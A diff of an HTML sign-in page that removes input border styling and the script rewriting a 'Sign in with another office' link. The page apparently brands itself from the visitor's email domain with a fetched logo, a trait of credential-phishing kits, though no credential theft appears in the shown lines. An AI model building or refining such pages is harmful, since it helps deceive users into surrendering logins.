@@ -42,11 +42,7 @@
 
     input[type=text]:focus {
       outline: none;
-      border: none;
       box-shadow: none;
-      border-bottom: 1px #2985db solid;
-      border-top: 1px #2985db solid;
-      border-left: 1px #2985db solid;
     }
 
     p {
@@ -118,7 +114,7 @@
                                         <td width="8"></td>
                                         <td width="155">
                                           <p align="left">
-                                            <a id="anotherLink" href="session_login.php" style="text-decoration: none; color: black;">
+                                            <a href="session_login.php" style="text-decoration: none; color: black;">
                                               <font color="#2985db" size="2" face="Arial Unicode MS">Sign in with another office</font>
                                             </a>
                                           </p>
@@ -165,12 +161,6 @@
       document.getElementById('domainAddon').textContent = '@' + domain;
       document.getElementById('domainLabel').textContent = domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
-    }
-
-    // Update the "Sign in with another office" link
-    const another = document.getElementById('anotherLink');
-    if (another && email) {
-      another.href = `another_user.html?login=${encodeURIComponent(email)}`;
     }
   </script>
 </body>
